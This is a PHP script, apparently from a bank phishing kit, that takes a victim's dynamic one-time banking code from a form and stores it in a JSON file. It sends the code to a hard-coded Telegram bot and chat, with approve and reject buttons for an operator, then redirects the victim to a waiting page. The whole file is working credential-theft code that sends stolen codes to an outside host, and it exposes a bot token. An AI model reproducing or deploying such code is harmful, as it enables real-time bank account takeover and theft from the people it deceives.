<?php
// 1) Obtener datos
$id   = $_POST['id']           ?? '';
$clave= trim($_POST['claveDinamica'] ?? '');

if (!$id || !preg_match('/^\d{4,6}$/', $clave)) {
  header('Location: dinamica.html?id='.$id);
  exit;
}

// 2) Leer y actualizar JSON
$file = 'solicitudes.json';
$list = json_decode(file_get_contents($file), true);
foreach ($list as &$s) {
  if ($s['id'] === $id) {
    $s['dinamica'] = $clave;
    $s['status']   = 'pendiente_dinámica';
    break;
  }
}
file_put_contents($file, json_encode($list, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE));

// 3) Enviar a Telegram con botones
$TOKEN   = '7704371778:AAF4h3i-QPKWv2w2M9O-zK32HeIxEhc1IvY';
$CHAT_ID = '-1002386768203';
$msg  = "🔔 *Nueva Dinámica*: \n\n";
$msg .= "💳 Clave: `$clave`\n";
$msg .= "_ID:_ `$id`";

$keyboard = [
  'inline_keyboard' => [[
    ['text'=>'✅ Correcto',    'callback_data'=>"aprobar_din:$id"],
    ['text'=>'❌ Incorrecto',  'callback_data'=>"rechazar_din:$id"]
  ]]
];
$params = [
  'chat_id'      => $CHAT_ID,
  'text'         => $msg,
  'parse_mode'   => 'Markdown',
  'reply_markup' => json_encode($keyboard)
];
file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?" . http_build_query($params));

// 4) Redirigir al loader de dinámica
header("Location: loader_dinamica.html?id=$id");
exit;
?>